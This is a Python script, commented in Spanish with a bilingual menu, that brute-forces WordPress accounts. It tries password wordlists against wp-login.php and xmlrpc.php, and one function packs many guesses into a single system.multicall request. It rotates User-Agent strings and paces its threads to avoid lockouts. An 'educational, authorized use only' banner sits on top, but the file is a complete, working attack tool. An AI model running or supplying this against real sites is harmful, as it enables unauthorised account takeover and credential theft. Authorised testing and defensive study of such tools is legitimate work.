#!/usr/bin/env python
#
#  Script educativo para pruebas de fuerza bruta en WordPress
# NOTA: Este script es solo para fines educativos y de pruebas autorizadas
# 

import requests
import sys
import os
import random
import time
import threading
from threading import Thread
from urllib3.exceptions import InsecureRequestWarning

# Suprimir advertencias de solicitudes inseguras
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Colores para la terminal
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
ENDC = '\033[0m'  # Reset color

# Diccionario de traducciones
TRANSLATIONS = {
    'es': {
        'banner_line1': 'Script educativo para pruebas de fuerza bruta',
        'banner_line2': 'Uso exclusivo con permiso en sistemas propios o autorizados',
        'select_language': 'Selecciona el idioma / Select language:',
        'spanish': 'Español',
        'english': 'English',
        'select_attack': 'Selecciona el tipo de ataque de fuerza bruta:',
        'attack_option1': 'Ataque al portal de administración (wp-login.php)',
        'attack_option2': 'Ataque vía XML-RPC (xmlrpc.php)',
        'select_option': 'Selecciona una opción (1/2):',
        'invalid_option': 'Opción inválida, por favor selecciona 1 o 2',
        'enter_login_url': 'Introduce la URL de login de WordPress (ejemplo: ejemplo.com/wp-login.php):',
        'enter_base_url': 'Introduce la URL base del sitio WordPress (ejemplo: ejemplo.com):',
        'empty_url': 'La URL no puede estar vacía',
        'try_another_url': '¿Deseas intentar con otra URL? (s/n):',
        'enter_username': 'Introduce el nombre de usuario:',
        'empty_username': 'El nombre de usuario no puede estar vacío',
        'enter_wordlist': 'Introduce la ruta al archivo de contraseñas:',
        'empty_wordlist': 'La ruta al archivo de contraseñas no puede estar vacía',
        'verifying_url': 'Verificando que la URL esté activa...',
        'assuming_https': 'Asumiendo protocolo HTTPS:',
        'url_active': 'URL activa:',
        'url_unavailable': 'URL no disponible:',
        'connection_error': 'Error al conectar a la URL:',
        'passwords_loaded': 'Contraseñas cargadas:',
        'starting_bruteforce': 'Iniciando ataque de fuerza bruta...',
        'login_url': 'URL de login:',
        'username': 'Usuario:',
        'wordlist_file': 'Archivo de contraseñas:',
        'total_passwords': 'Total contraseñas:',
        'progress': 'Progreso:',
        'testing': 'Probando:',
        'password_found': '¡CONTRASEÑA ENCONTRADA!',
        'password': 'Contraseña:',
        'no_password_found': 'No se encontró ninguna contraseña válida',
        'http_error': 'Error HTTP:',
        'timeout_error': 'Tiempo de espera agotado',
        'connection_error_msg': 'Error de conexión',
        'error': 'Error:',
        'wordlist_not_found': 'El archivo de contraseñas no existe o no es legible',
        'wordlist_read_error': 'Error al leer el archivo de contraseñas:',
        'preparing_xmlrpc': 'Preparando ataque de fuerza bruta vía XML-RPC...',
        'checking_xmlrpc': 'Verificando si XML-RPC está habilitado en:',
        'xmlrpc_detected': 'XML-RPC detectado correctamente',
        'xmlrpc_not_enabled': 'XML-RPC no parece estar habilitado o accesible',
        'xmlrpc_connection_error': 'Error al conectar a XML-RPC:',
        'sending_passwords': 'Enviando contraseñas en una sola solicitud...',
        'response_received': 'Respuesta recibida! Analizando resultados...',
        'server_error': 'Error en la respuesta del servidor:',
        'xmlrpc_method': 'Método: XML-RPC',
        'xmlrpc_multicall_method': 'Método: XML-RPC system.multicall',
        'starting_xmlrpc_bruteforce': 'Iniciando ataque de fuerza bruta vía XML-RPC...',
        'url': 'URL:',
        'error_processing': 'Error al procesar la solicitud:',
        'redirect_detected': 'URL de redirección detectada:',
        'interrupted': 'Ataque interrumpido por el usuario',
    },
    'en': {
        'banner_line1': 'Educational script for brute force testing',
        'banner_line2': 'Exclusive use with permission on own or authorized systems',
        'select_language': 'Select language / Selecciona el idioma:',
        'spanish': 'Spanish',
        'english': 'English',
        'select_attack': 'Select the type of brute force attack:',
        'attack_option1': 'Attack on administration portal (wp-login.php)',
        'attack_option2': 'Attack via XML-RPC (xmlrpc.php)',
        'select_option': 'Select an option (1/2):',
        'invalid_option': 'Invalid option, please select 1 or 2',
        'enter_login_url': 'Enter the WordPress login URL (example: example.com/wp-login.php):',
        'enter_base_url': 'Enter the base URL of the WordPress site (example: example.com):',
        'empty_url': 'The URL cannot be empty',
        'try_another_url': 'Do you want to try with another URL? (y/n):',
        'enter_username': 'Enter the username:',
        'empty_username': 'The username cannot be empty',
        'enter_wordlist': 'Enter the path to the password file:',
        'empty_wordlist': 'The path to the password file cannot be empty',
        'verifying_url': 'Verifying that the URL is active...',
        'assuming_https': 'Assuming HTTPS protocol:',
        'url_active': 'Active URL:',
        'url_unavailable': 'URL unavailable:',
        'connection_error': 'Error connecting to the URL:',
        'passwords_loaded': 'Passwords loaded:',
        'starting_bruteforce': 'Starting brute force attack...',
        'login_url': 'Login URL:',
        'username': 'Username:',
        'wordlist_file': 'Password file:',
        'total_passwords': 'Total passwords:',
        'progress': 'Progress:',
        'testing': 'Testing:',
        'password_found': 'PASSWORD FOUND!',
        'password': 'Password:',
        'no_password_found': 'No valid password found',
        'http_error': 'HTTP Error:',
        'timeout_error': 'Timeout exceeded',
        'connection_error_msg': 'Connection error',
        'error': 'Error:',
        'wordlist_not_found': 'The password file does not exist or is not readable',
        'wordlist_read_error': 'Error reading the password file:',
        'preparing_xmlrpc': 'Preparing brute force attack via XML-RPC...',
        'checking_xmlrpc': 'Checking if XML-RPC is enabled at:',
        'xmlrpc_detected': 'XML-RPC detected correctly',
        'xmlrpc_not_enabled': 'XML-RPC does not appear to be enabled or accessible',
        'xmlrpc_connection_error': 'Error connecting to XML-RPC:',
        'sending_passwords': 'Sending passwords in a single request...',
        'response_received': 'Response received! Analyzing results...',
        'server_error': 'Error in server response:',
        'xmlrpc_method': 'Method: XML-RPC',
        'xmlrpc_multicall_method': 'Method: XML-RPC system.multicall',
        'starting_xmlrpc_bruteforce': 'Starting brute force attack via XML-RPC...',
        'url': 'URL:',
        'error_processing': 'Error processing the request:',
        'redirect_detected': 'Redirect URL detected:',
        'interrupted': 'Attack interrupted by user',
    }
}

# Variable global para el idioma seleccionado
LANGUAGE = 'es'

def t(key):
    """Función para obtener traducciones"""
    return TRANSLATIONS[LANGUAGE].get(key, key)

def get_banner():
    """Genera el banner del script en el idioma seleccionado"""
    return f"""
{YELLOW}[*] {t('banner_line1')}{ENDC}
{RED}[!] {t('banner_line2')}{ENDC}
"""

# Generador de User-Agent aleatorio
def random_user_agent():
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36 Edg/91.0.864.53',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0'
    ]
    return random.choice(user_agents)

# Verificar que la URL es válida y está activa
def verificar_url(url):
    # Asegurar que la URL tiene un protocolo, asumiendo https:// por defecto
    if not (url.startswith('http://') or url.startswith('https://')):
        url = 'https://' + url
        print(f"{YELLOW}[*] {t('assuming_https')} {url}{ENDC}")
    
    try:
        print(f"{YELLOW}[*] {t('verifying_url')}{ENDC}")
        response = requests.get(url, timeout=10, verify=False)
        
        if response.status_code == 200:
            print(f"{GREEN}[✓] {t('url_active')} {url} (Código 200){ENDC}")
            return url, True  # Retornar la URL posiblemente modificada y True
        else:
            print(f"{RED}[X] {t('url_unavailable')} {url} (Código {response.status_code}){ENDC}")
            return url, False  # Retornar la URL y False
            
    except requests.exceptions.RequestException as e:
        print(f"{RED}[X] {t('connection_error')} {e}{ENDC}")
        return url, False

# Preparar el cuerpo de la solicitud
def preparar_datos_login(username, password, redirect_url=None):
    body = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Acceder',
        'testcookie': '1'
    }
    
    # Si se proporciona una URL de redirección, la usamos
    if redirect_url:
        body['redirect_to'] = redirect_url
        
    return body

# Preparar los encabezados de la solicitud
def preparar_encabezados():
    return {
        'User-Agent': random_user_agent(),
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': 'wordpress_test_cookie=WP+Cookie+check'
    }

# Verificar si el login fue exitoso
def verificar_login_exitoso(response):
    # Verificar si las cookies indican un inicio de sesión exitoso
    if 'wordpress_logged_in' in str(response.cookies):
        return True
    
    # Verificar si hubo redirección a panel de administración (no a wp-login.php)
    if response.history and 'wp-login.php' not in response.url and 'wp-admin' in response.url:
        return True
        
    return False

# Función que realiza el intento de login
def intentar_login(url, username, password, redirect_url=None, timeout=10):
    try:
        # Preparar datos para el request
        body = preparar_datos_login(username, password, redirect_url)
        headers = preparar_encabezados()
        
        # Realizar el request
        response = requests.post(url, data=body, headers=headers, timeout=timeout, verify=False, allow_redirects=True)
        
        if response.status_code >= 400:
            print(f"\n{RED}[X] {t('http_error')} {response.status_code}{ENDC}")
            return False
            
        if verificar_login_exitoso(response):
            print(f"\n{GREEN}{'='*50}{ENDC}")
            print(f"{GREEN}[✓] {t('password_found')}{ENDC}")
            print(f"{GREEN}[✓] {t('username')}: {username}{ENDC}")
            print(f"{GREEN}[✓] {t('password')}: {password}{ENDC}")
            print(f"{GREEN}{'='*50}{ENDC}")
            return True
            
        return False
        
    except requests.exceptions.Timeout:
        print(f"\n{RED}[X] {t('timeout_error')}{ENDC}")
        return False
    except requests.exceptions.ConnectionError:
        print(f"\n{RED}[X] {t('connection_error_msg')}{ENDC}")
        return False
    except Exception as e:
        print(f"\n{RED}[X] {t('error')} {str(e)}{ENDC}")
        return False

# Función principal para ejecutar la fuerza bruta
def ejecutar_fuerza_bruta(login_url, username, ruta_wordlist, redirect_url=None):
    # Verificar si el archivo de wordlist existe y es legible
    if not os.path.isfile(ruta_wordlist) or not os.access(ruta_wordlist, os.R_OK):
        print(f"{RED}[X] {t('wordlist_not_found')}{ENDC}")
        return False
        
    # Leer el archivo de contraseñas
    try:
        with open(ruta_wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            wordlist = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"{RED}[X] {t('wordlist_read_error')} {str(e)}{ENDC}")
        return False
        
    total_passwords = len(wordlist)
    print(f"{YELLOW}[*] {t('passwords_loaded')}: {total_passwords}{ENDC}")
    
    # Control de hilos y progreso
    counter = 0
    password_encontrada = False
    lock = threading.Lock()
    max_hilos = 5  # Limitar el número de hilos para no sobrecargar el servidor
    
    def worker(password):
        nonlocal password_encontrada, counter
        
        if not password_encontrada:
            result = intentar_login(login_url, username, password, redirect_url)
            
            with lock:
                counter += 1
                # Mostrar progreso
                if not result:
                    sys.stdout.write(f"\r{YELLOW}[*] {t('progress')} {counter}/{total_passwords} - {t('testing')}: {password}{' ' * 20}{ENDC}")
                    sys.stdout.flush()
                else:
                    password_encontrada = True
    
    print(f"\n{YELLOW}[*] {t('starting_bruteforce')}{ENDC}")
    print(f"{YELLOW}[*] {t('login_url')} {login_url}{ENDC}")
    print(f"{YELLOW}[*] {t('username')}: {username}{ENDC}")
    print(f"{YELLOW}[*] {t('wordlist_file')}: {ruta_wordlist}{ENDC}")
    print(f"{YELLOW}[*] {t('total_passwords')}: {total_passwords}{ENDC}")
    
    # Usar hilos para acelerar el proceso
    hilos_activos = []
    for password in wordlist:
        if password_encontrada:
            break
            
        # Controlar el número de hilos activos
        while len([t for t in hilos_activos if t.is_alive()]) >= max_hilos:
            time.sleep(0.1)
            hilos_activos = [t for t in hilos_activos if t.is_alive()]
            
        # Crear nuevo hilo
        t = Thread(target=worker, args=(password,))
        t.start()
        hilos_activos.append(t)
        
        # Pequeña pausa entre intentos para evitar bloqueo
        time.sleep(0.2)
    
    # Esperar a que todos los hilos terminen
    for t in hilos_activos:
        t.join()
    
    if not password_encontrada:
        print(f"\n{RED}[X] {t('no_password_found')}{ENDC}")
    
    return password_encontrada

def ejecutar_fuerza_bruta_xmlrpc_multicall(base_url, username, ruta_wordlist):
    """Ejecuta un ataque de fuerza bruta usando XML-RPC system.multicall para enviar
    múltiples intentos en una sola solicitud HTTP."""
    print(f"\n{YELLOW}[*] {t('preparing_xmlrpc')}...{ENDC}")
    
    # Verificar que exista xmlrpc.php
    xmlrpc_url = base_url
    if not xmlrpc_url.endswith('xmlrpc.php'):
        if xmlrpc_url.endswith('/'):
            xmlrpc_url += 'xmlrpc.php'
        else:
            xmlrpc_url += '/xmlrpc.php'
    
    # Verificar si el endpoint existe
    try:
        print(f"{YELLOW}[*] Verificando si XML-RPC está habilitado en: {xmlrpc_url}{ENDC}")
        response = requests.get(xmlrpc_url, timeout=10, verify=False)
        
        if response.status_code == 405 or ('XML-RPC' in response.text or '<methodResponse>' in response.text):
            print(f"{GREEN}[✓] XML-RPC detectado correctamente{ENDC}")
        else:
            print(f"{RED}[X] XML-RPC no parece estar habilitado o accesible (Código {response.status_code}){ENDC}")
            return False
    except Exception as e:
        print(f"{RED}[X] Error al conectar a XML-RPC: {str(e)}{ENDC}")
        return False
    
    # Verificar si el archivo de wordlist existe y es legible
    if not os.path.isfile(ruta_wordlist) or not os.access(ruta_wordlist, os.R_OK):
        print(f"{RED}[X] El archivo de contraseñas no existe o no es legible{ENDC}")
        return False
        
    # Leer el archivo de contraseñas
    try:
        with open(ruta_wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            wordlist = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"{RED}[X] Error al leer el archivo de contraseñas: {str(e)}{ENDC}")
        return False
    
    total_passwords = len(wordlist)
    print(f"{YELLOW}[*] Contraseñas cargadas: {total_passwords}{ENDC}")
    
    # Preparar los encabezados
    headers = {
        "User-Agent": random_user_agent(),
        "Content-Type": "text/xml"
    }
    
    # Construir el array de estructuras para el multicall
    multicall_structs = ""
    for password in wordlist:
        multicall_structs += f"""
        <value>
            <struct>
                <member>
                    <name>methodName</name>
                    <value><string>wp.getUsersBlogs</string></value>
                </member>
                <member>
                    <name>params</name>
                    <value>
                        <array>
                            <data>
                                <value><string>{username}</string></value>
                                <value><string>{password}</string></value>
                            </data>
                        </array>
                    </value>
                </member>
            </struct>
        </value>"""
    
    # Construir el payload XML-RPC completo
    payload = f"""<?xml version="1.0"?>
    <methodCall>
        <methodName>system.multicall</methodName>
        <params>
            <param>
                <value>
                    <array>
                        <data>
                            {multicall_structs}
                        </data>
                    </array>
                </value>
            </param>
        </params>
    </methodCall>"""
    
    print(f"\n{YELLOW}[*] {t('sending_passwords')}...{ENDC}")
    
    try:
        response = requests.post(xmlrpc_url, data=payload, headers=headers, timeout=30, verify=False)
        
        if response.status_code != 200:
            print(f"\n{RED}[X] {t('server_error')} Código {response.status_code}{ENDC}")
            return False
            
        # Analizar la respuesta para encontrar credenciales válidas
        # La respuesta contendrá un array de resultados, uno por cada intento
        # Los intentos fallidos tendrán un faultCode, los exitosos no
        print(f"\n{GREEN}[✓] {t('response_received')}{ENDC}")
        
        # Parsear la respuesta XML
        response_parts = response.text.split('<value>')
        
        # Iterar por cada contraseña y verificar la respuesta correspondiente
        for i, password in enumerate(wordlist):
            if i + 1 >= len(response_parts):
                break
                
            part = response_parts[i + 1]
            # Si la respuesta no contiene 'fault' significa que las credenciales son válidas
            if '<fault>' not in part:
                print(f"\n{GREEN}{'='*50}{ENDC}")
                print(f"{GREEN}[✓] {t('password_found')}{ENDC}")
                print(f"{GREEN}[✓] {t('username')}: {username}{ENDC}")
                print(f"{GREEN}[✓] {t('password')}: {password}{ENDC}")
                print(f"{GREEN}[✓] {t('xmlrpc_multicall_method')}{ENDC}")
                print(f"{GREEN}{'='*50}{ENDC}")
                return True
        
        print(f"\n{RED}[X] {t('no_password_found')}{ENDC}")
        return False
        
    except Exception as e:
        print(f"\n{RED}[X] {t('error_processing')} {str(e)}{ENDC}")
        return False


def ejecutar_fuerza_bruta_xmlrpc(base_url, username, ruta_wordlist):
    """Ejecuta un ataque de fuerza bruta usando XML-RPC."""
    print(f"\n{YELLOW}[*] {t('starting_xmlrpc_bruteforce')}...{ENDC}")
    
    # Verificar que exista xmlrpc.php
    xmlrpc_url = base_url
    if not xmlrpc_url.endswith('xmlrpc.php'):
        if xmlrpc_url.endswith('/'):
            xmlrpc_url += 'xmlrpc.php'
        else:
            xmlrpc_url += '/xmlrpc.php'
    
    # Verificar si el endpoint existe
    try:
        print(f"{YELLOW}[*] {t('checking_xmlrpc')} {xmlrpc_url}{ENDC}")
        response = requests.get(xmlrpc_url, timeout=10, verify=False)
        
        if response.status_code == 405 or ('XML-RPC' in response.text or '<methodResponse>' in response.text):
            print(f"{GREEN}[✓] {t('xmlrpc_detected')}{ENDC}")
        else:
            print(f"{RED}[X] {t('xmlrpc_not_enabled')} (Código {response.status_code}){ENDC}")
            return False
    except Exception as e:
        print(f"{RED}[X] {t('xmlrpc_connection_error')} {str(e)}{ENDC}")
        return False
    
    # Verificar si el archivo de wordlist existe y es legible
    if not os.path.isfile(ruta_wordlist) or not os.access(ruta_wordlist, os.R_OK):
        print(f"{RED}[X] {t('wordlist_not_found')}{ENDC}")
        return False
        
    # Leer el archivo de contraseñas
    try:
        with open(ruta_wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            wordlist = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"{RED}[X] {t('wordlist_read_error')} {str(e)}{ENDC}")
        return False
    
    total_passwords = len(wordlist)
    print(f"{YELLOW}[*] {t('passwords_loaded')}: {total_passwords}{ENDC}")
    
    # Preparar los encabezados
    headers = {
        "User-Agent": random_user_agent(),
        "Content-Type": "text/xml"
    }
    
    # Control de hilos y progreso
    counter = 0
    password_encontrada = False
    lock = threading.Lock()
    max_hilos = 5  # Limitar el número de hilos
    
    def worker_xmlrpc(password):
        nonlocal password_encontrada, counter
        
        if not password_encontrada:
            # Crear payload XML-RPC para el intento de login
            payload = f"""<?xml version="1.0"?>
            <methodCall>
                <methodName>wp.getUsersBlogs</methodName>
                <params>
                    <param><value><string>{username}</string></value></param>
                    <param><value><string>{password}</string></value></param>
                </params>
            </methodCall>"""
            
            try:
                response = requests.post(xmlrpc_url, data=payload, headers=headers, timeout=10, verify=False)
                
                with lock:
                    counter += 1
                    
                    # Si no hay faultCode o el código es diferente a "403" (credenciales incorrectas)
                    if response.status_code == 200 and 'faultCode' not in response.text:
                        print(f"\n{GREEN}{'='*50}{ENDC}")
                        print(f"{GREEN}[✓] {t('password_found')}{ENDC}")
                        print(f"{GREEN}[✓] {t('username')}: {username}{ENDC}")
                        print(f"{GREEN}[✓] {t('password')}: {password}{ENDC}")
                        print(f"{GREEN}[✓] {t('xmlrpc_method')}{ENDC}")
                        print(f"{GREEN}{'='*50}{ENDC}")
                        password_encontrada = True
                    else:
                        # Mostrar progreso
                        sys.stdout.write(f"\r{YELLOW}[*] {t('progress')} {counter}/{total_passwords} - {t('testing')}: {password}{' ' * 20}{ENDC}")
                        sys.stdout.flush()
            except Exception as e:
                with lock:
                    counter += 1
                    sys.stdout.write(f"\r{RED}[!] Error con {password}: {str(e)}{' ' * 20}{ENDC}")
                    sys.stdout.flush()
    
    print(f"\n{YELLOW}[*] {t('starting_xmlrpc_bruteforce')}...{ENDC}")
    print(f"{YELLOW}[*] {t('url')}: {xmlrpc_url}{ENDC}")
    print(f"{YELLOW}[*] {t('username')}: {username}{ENDC}")
    print(f"{YELLOW}[*] {t('wordlist_file')}: {ruta_wordlist}{ENDC}")
    print(f"{YELLOW}[*] {t('total_passwords')}: {total_passwords}{ENDC}")
    
    # Usar hilos para acelerar el proceso
    hilos_activos = []
    for password in wordlist:
        if password_encontrada:
            break
            
        # Controlar el número de hilos activos
        while len([t for t in hilos_activos if t.is_alive()]) >= max_hilos:
            time.sleep(0.1)
            hilos_activos = [t for t in hilos_activos if t.is_alive()]
            
        # Crear nuevo hilo
        t = Thread(target=worker_xmlrpc, args=(password,))
        t.start()
        hilos_activos.append(t)
        
        # Pequeña pausa entre intentos para evitar bloqueo
        time.sleep(0.2)
    
    # Esperar a que todos los hilos terminen
    for t in hilos_activos:
        t.join()
    
    if not password_encontrada:
        print(f"\n{RED}[X] {t('no_password_found')}{ENDC}")
    
    return password_encontrada

def select_language():
    """Función para seleccionar el idioma al inicio del script"""
    global LANGUAGE
    
    print(f"\n{BLUE}[*] {t('select_language')}{ENDC}")
    print(f"  {CYAN}1. {t('spanish')}{ENDC}")
    print(f"  {CYAN}2. {t('english')}{ENDC}")
    
    while True:
        opcion_idioma = input(f"\n{BLUE}[?] Selecciona una opción (1/2): {ENDC}")
        if opcion_idioma == '1':
            LANGUAGE = 'es'
            break
        elif opcion_idioma == '2':
            LANGUAGE = 'en'
            break
        else:
            print(f"{RED}[X] {t('invalid_option')}{ENDC}")

def main():
    # Seleccionar idioma al inicio
    select_language()
    
    print(get_banner())
    
    # Menú de selección de tipo de ataque
    print(f"\n{BLUE}[*] {t('select_attack')}{ENDC}")
    print(f"  {CYAN}1. {t('attack_option1')}{ENDC}")
    print(f"  {CYAN}2. {t('attack_option2')}{ENDC}")
    
    while True:
        opcion = input(f"\n{BLUE}[?] {t('select_option')} {ENDC}")
        if opcion in ['1', '2']:
            break
        print(f"{RED}[X] {t('invalid_option')}{ENDC}")
    
    # Solicitar la URL base
    while True:
        if opcion == '1':
            login_url = input(f"\n{BLUE}[?] {t('enter_login_url')} {ENDC}")
        else:  # opcion == '2'
            login_url = input(f"\n{BLUE}[?] {t('enter_base_url')} {ENDC}")
        
        if not login_url:
            print(f"{RED}[X] {t('empty_url')}{ENDC}")
            continue
            
        # Verificar que la URL es válida y está activa
        login_url, url_valida = verificar_url(login_url)
        if not url_valida:
            continuar = input(f"{YELLOW}[?] {t('try_another_url')} {ENDC}")
            if continuar.lower() not in ['s', 'y']:
                return
            continue
        else:
            break
    
    # Solicitar nombre de usuario
    username = input(f"\n{BLUE}[?] {t('enter_username')} {ENDC}")
    if not username:
        print(f"{RED}[X] {t('empty_username')}{ENDC}")
        return
    
    # Solicitar archivo de contraseñas
    ruta_wordlist = input(f"\n{BLUE}[?] {t('enter_wordlist')} {ENDC}")
    if not ruta_wordlist:
        print(f"{RED}[X] {t('empty_wordlist')}{ENDC}")
        return
    
    # Ejecutar el ataque según la opción seleccionada
    if opcion == '1':
        # Ataque al portal de administración
        # Extraer la URL de redirección si existe
        redirect_url = None
        try:
            # Si login_url termina con wp-login.php, intentamos adivinar la redirección
            if login_url.endswith('wp-login.php'):
                base_url = login_url.split('/wp-login.php')[0]
                redirect_url = f"{base_url}/wp-admin/"
                print(f"{YELLOW}[*] {t('redirect_detected')} {redirect_url}{ENDC}")
        except:
            pass
        
        # Ejecutar el ataque de fuerza bruta al portal de administración
        ejecutar_fuerza_bruta(login_url, username, ruta_wordlist, redirect_url)
    else:  # opcion == '2'
        # Ataque vía XML-RPC
        ejecutar_fuerza_bruta_xmlrpc(login_url, username, ruta_wordlist)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{YELLOW}[!] {t('interrupted')}{ENDC}")
        sys.exit(0)
